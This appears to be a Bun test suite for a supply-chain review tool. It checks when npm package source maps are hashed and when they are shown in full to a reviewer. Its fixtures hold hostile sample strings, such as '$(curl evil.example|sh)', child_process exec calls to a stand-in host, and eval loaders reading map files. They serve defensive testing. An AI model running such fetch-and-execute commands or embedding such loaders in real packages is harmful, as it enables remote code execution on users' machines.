import { describe, expect, test } from "bun:test";
import { reviewUpdate, chunkDiff } from "../src/review.ts";
import type { FileMap } from "../src/prepass.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const pj = (o: object) => JSON.stringify({ name: "lib", ...o });

// Shaped like solana-web3js 1.95.5 and tinycolor 4.1.0: big generated maps and declarations, one small real change.
const mapOf = (mappings: string, extra: object = {}) => JSON.stringify({ version: 3, file: "index.js", sources: ["../src/index.ts"], names: [], mappings, ...extra });
const bigMap = (seed: string) => mapOf(Array.from({ length: 4000 }, (_, i) => `AAAA${seed.replace(/[^A-Za-z]/g, "")}${"ABCDEFGH"[i % 8]}`).join(";"));
const bigDts = (seed: string) => Array.from({ length: 2000 }, (_, i) => `export declare function f${seed}${i}(a: number, b: string): Promise<void>;`).join("\n");

const release = (seed: string, code: string, extra: Record<string, string> = {}) =>
  files({
    "package.json": pj({ version: seed, main: "lib/index.js", types: "lib/index.d.ts" }),
    "lib/index.js": code,
    "lib/index.js.map": bigMap(seed),
    "lib/other.js.map": bigMap(seed + "o"),
    ...extra,
  });

const run = (old: FileMap, now: FileMap, reviewed: string[] = [], maxParts?: number) =>
  reviewUpdate({
    eco: "npm", name: "lib", from: "1.0.0", to: "1.0.1",
    registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
    advisories: { query: async () => [] },
    reviewer: { name: "fake", review: async (p) => (reviewed.push(p), "APPROVE\nno attack indicators found") },
    cooldownDays: 1, now: new Date("2026-10-21T00:00:00Z"),
    loadArtifacts: async () => ({ old, new: now }),
    chunkChars: 8000,
    maxParts,
  });

const full = (old: FileMap, now: FileMap) => chunkDiff(old, now, 8000).join("");

describe("strict source maps are hashed", () => {
  test("big map churn with a small real change lands", async () => {
    const reviewed: string[] = [];
    const r = await run(release("a", "exports.v = 1;\n"), release("b", "exports.v = 2;\n"), reviewed);
    expect(r.layers.find((l) => l.layer === "reviewer")?.detail).toMatch(/APPROVE on \d+ part\(s\)$/);
    expect(r.decision).toBe("land");
    expect(reviewed.join("")).toContain("exports.v = 2;");
    expect(reviewed.join("")).toContain("[source map, strict v3 data");
  });

  test("the hash line carries the sourcesContent size and sha", () => {
    const m = mapOf("AAAA", { sourcesContent: ["const a = 1;"] });
    const text = full(files({ "package.json": pj({}) }), files({ "package.json": pj({}), "a.js.map": m }));
    expect(text).toMatch(/sourcesContent 12 bytes sha256 [0-9a-f]{16}\]/);
  });
});

describe("everything else is shown in full", () => {
  const base = files({ "package.json": pj({}), "index.js": "x" });
  const added = (o: Record<string, string>) => full(base, files({ "package.json": pj({}), "index.js": "x", ...o }));

  test("a .d.ts is always shown in full, plugin-folder loader or not", () => {
    const loader = "for (const f of fs.readdirSync('plugins')) require('./plugins/' + f);\n";
    const old = files({ "package.json": pj({}), "index.js": loader, "plugins/a.js": "1" });
    const text = full(old, files({ "package.json": pj({}), "index.js": loader, "plugins/a.js": "1", "plugins/hook.d.ts": 'globalThis["hook"]();\n' }));
    expect(text).toContain('globalThis["hook"]()');
    expect(added({ "t.d.ts": bigDts("q"), "t.d.mts": "export {};", "t.d.cts": "export {};" })).toContain("fq1999");
  });

  test("a .map with shell text in mappings is shown in full", () => {
    expect(added({ "a.js.map": mapOf("$(curl evil.example|sh)") })).toContain("curl evil.example");
  });

  test("a .map with an extra key, a wrong type, version 2 or a JS body is shown in full", () => {
    expect(added({ "a.js.map": mapOf("AAAA", { run: "curl evil.example" }) })).toContain("curl evil.example");
    expect(added({ "a.js.map": mapOf("AAAA", { sources: [{ x: "curl evil.example" }] }) })).toContain("curl evil.example");
    expect(added({ "a.js.map": JSON.stringify({ version: 2, mappings: "AAAA", sources: [], x: "curl evil.example" }) })).toContain("curl evil.example");
    expect(added({ "a.js.map": "require('child_process').exec('curl evil.example');" })).toContain("curl evil.example");
  });

  test("an upper-case .MAP is shown in full", () => {
    expect(added({ "A.MAP": mapOf("AAAA", { names: ["marker_name"] }) })).toContain("marker_name");
  });

  test("a .map whose name or stem is quoted in code is shown in full", () => {
    const withCode = (code: string) => full(base, files({ "package.json": pj({}), "index.js": code, "lib/data.js.map": mapOf("AAAA", { names: ["marker_name"] }) }));
    expect(withCode("require('./lib/data.js.map')")).toContain("marker_name");
    expect(withCode("const n = 'data.js'; load(n + '.map')")).toContain("marker_name");
    expect(withCode("const n = 'unrelated'")).not.toContain("marker_name");
  });

  test("a literal concatenation or path.join of literals links the map", () => {
    const marked = (code: string, map = "a.map") => full(base, files({ "package.json": pj({}), "index.js": code, [map]: mapOf("AAAA", { names: ["marker_name"] }) }));
    expect(marked("fs.readFileSync(path.join(__dirname, 'a' + '.map'))")).toContain("marker_name");
    expect(marked("fs.readFileSync(path.resolve(__dirname, 'pre' + 'fix.js.map'))", "prefix.js.map")).toContain("marker_name");
    expect(marked("fs.readFileSync('x' + '.js.map')", "x.js.map")).toContain("marker_name");
    expect(marked("fs.readFileSync(`x` + '.js.map')", "x.js.map")).toContain("marker_name");
    expect(marked("fs.readFileSync(path.join(__dirname, name + '.js.map'))", "x.js.map")).not.toContain("marker_name");
    // A constant template folds to one string. A template with a real expression does not.
    expect(marked("fs.readFileSync(`x${''}.js.map`)", "x.js.map")).toContain("marker_name");
    expect(marked("fs.readFileSync(`x${name}.js.map`)", "x.js.map")).not.toContain("marker_name");
  });

  test("bun folds literal concatenations before a map path is trusted", () => {
    const t = new Bun.Transpiler({ loader: "js", inline: true, minifySyntax: true } as Bun.TranspilerOptions);
    const out = (s: string) => t.transformSync(s);
    expect(out("require('./pay' + 'load.js')")).toContain("payload.js");
    expect(out("fs.readFileSync('pre' /*c*/ + 'fix.map')")).toContain("prefix.map");
    expect(out("fs.readFileSync(('pre') + 'fix.map')")).toContain("prefix.map");
    expect(out("fs.readFileSync('pre' + 'fix\\x2emap')")).toContain("prefix.map");
  });

  test("a map loaded by a folded literal path is shown whole", () => {
    const body = (code: string) => full(base, files({ "package.json": pj({}), "index.js": code, "prefix.map": mapOf("AAAA", { sourcesContent: ["steal_folded_map()"] }) }));
    for (const code of [
      "const m = JSON.parse(fs.readFileSync('pre' /*comment*/ + 'fix.map')); (0, eval)(m['sources' + 'Content'][0]);",
      "fs.readFileSync(('pre') + 'fix.map')",
      "fs.readFileSync('pre' + 'fix\\x2emap')",
    ]) {
      const text = body(code);
      expect(text).toContain("steal_folded_map()");
      expect(text).not.toContain("[source map, strict v3 data");
    }
  });

  test("a .map named by package.json main is shown in full", () => {
    const text = full(files({ "package.json": pj({}) }), files({ "package.json": pj({ main: "m.js.map" }), "m.js.map": mapOf("AAAA", { names: ["marker_name"] }) }));
    expect(text).toContain("marker_name");
  });

  test("a .map with a pre-pass or scanner signal is shown in full", async () => {
    const reviewed: string[] = [];
    const old = files({ "package.json": pj({ version: "1" }), "index.js": "x", "a.js.map": mapOf("AAAA") });
    const now = files({ "package.json": pj({ version: "2" }), "index.js": "x", "a.js.map": mapOf("AAAA", { names: ["marker_name"] }) });
    await reviewUpdate({
      eco: "npm", name: "lib", from: "1", to: "2",
      registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
      advisories: { query: async () => [] },
      reviewer: { name: "fake", review: async (p) => (reviewed.push(p), "APPROVE\nno attack indicators found") },
      scanner: { name: "scan", scan: async (_e, f) => [...f].filter(([k, b]) => k.endsWith(".map") && new TextDecoder().decode(b).includes("marker_name")).map(([path]) => ({ rule: "r", path, detail: "hit" })) },
      cooldownDays: 1, now: new Date("2026-10-21T00:00:00Z"),
      loadArtifacts: async () => ({ old, new: now }),
    });
    expect(reviewed.join("")).toContain("marker_name");
  });

  test("a filename with a regex metacharacter does not crash the review", async () => {
    const r = await run(release("a", "x"), release("b", "x", { "lib/*.d.ts": "export {};", "lib/*.map": mapOf("AAAA"), "lib/(a+.map": mapOf("AAAA") }));
    expect(r.layers.find((l) => l.layer === "reviewer")?.verdict).toBe("pass");
  });

  test("round-3: a 200 KB hostile quoted line finishes in well under a second", () => {
    const line = "// '" + "\\'".repeat(100_000);
    expect(line.length).toBeGreaterThanOrEqual(200_000);
    const t0 = performance.now();
    const text = full(files({ "package.json": pj({}) }), files({ "package.json": pj({}), "hostile.js": line, "a.js.map": mapOf("AAAA", { names: ["marker_name"] }) }));
    expect(performance.now() - t0).toBeLessThan(1000);
    expect(text).not.toContain("marker_name");
  });

  test("round-3: a template literal that spans lines still names the map stem", () => {
    const text = full(base, files({ "package.json": pj({}), "index.js": "const n = `\n./lib/data.js`;\n", "lib/data.js.map": mapOf("AAAA", { names: ["marker_name"] }) }));
    expect(text).toContain("marker_name");
  });

  const marked = mapOf("AAAA", { names: ["marker_name"], sourcesContent: ["exec('curl evil|sh')"] });
  const withFiles = (extra: Record<string, string>) => full(files({ "package.json": pj({}) }), files({ "package.json": pj({}), "x.js.map": marked, ...extra }));

  test("round-3: a .d.ts loader that quotes the map is shown in full", () => {
    expect(withFiles({ "index.d.ts": "eval(readFileSync(__dirname+'/x.js.map'))" })).toContain("marker_name");
  });

  test("round-3: a declaration that only quotes its sibling script still hashes the map", () => {
    const text = full(files({ "package.json": pj({}) }), files({ "package.json": pj({ main: "index.js" }), "index.d.ts": 'export * from "./index.js";\n', "index.js.map": mapOf("AAAA", { names: ["marker_name"] }) }));
    expect(text).not.toContain("marker_name");
  });

  test("round-3: a non-code package.json entry that quotes the map is shown in full", () => {
    const text = full(files({ "package.json": pj({}) }), files({ "package.json": pj({ main: "lib.md" }), "lib.md": "eval(readFileSync('x.js.map'))", "x.js.map": marked }));
    expect(text).toContain("marker_name");
  });

  test("round-3: a don't earlier on the line still shows the map", () => {
    expect(withFiles({ "index.js": "// don't read 'x.js.map'" })).toContain("marker_name");
  });

  test("round-3: an upper-case quoted path shows the map", () => {
    expect(withFiles({ "index.js": "readFileSync('/X.JS.MAP')" })).toContain("marker_name");
  });

  test("round-3: sourcesContent in a non-map file shows every map", () => {
    expect(withFiles({ "readme.txt": "the key is sourcesContent" })).toContain("marker_name");
  });

  test("round-3: Array.prototype.map in code still hashes the map", () => {
    expect(withFiles({ "index.js": "items.map((x) => x)" })).not.toContain("marker_name");
  });

  test("round-3: a sourceMappingURL comment alone still hashes the map", () => {
    expect(withFiles({ "index.js": "//# sourceMappingURL=x.js.map\nexports.v = 1;\n" })).not.toContain("marker_name");
  });

  test("round-3: ignoreList and x_google_ignoreList hash only as arrays of integers", () => {
    expect(added({ "a.js.map": mapOf("AAAA", { names: ["marker_name"], ignoreList: [0, 1], x_google_ignoreList: [2] }) })).not.toContain("marker_name");
    expect(added({ "a.js.map": mapOf("AAAA", { names: ["marker_name"], ignoreList: [{ a: "b" }] }) })).toContain("marker_name");
    expect(added({ "a.js.map": mapOf("AAAA", { names: ["marker_name"], ignoreList: [1.5] }) })).toContain("marker_name");
    expect(added({ "a.js.map": mapOf("AAAA", { names: ["marker_name"], ignoreList: ["0"] }) })).toContain("marker_name");
    expect(added({ "a.js.map": mapOf("AAAA", { names: ["marker_name"], x_google_ignoreList: { payload: "marker_payload" } }) })).toContain("marker_payload");
  });
});
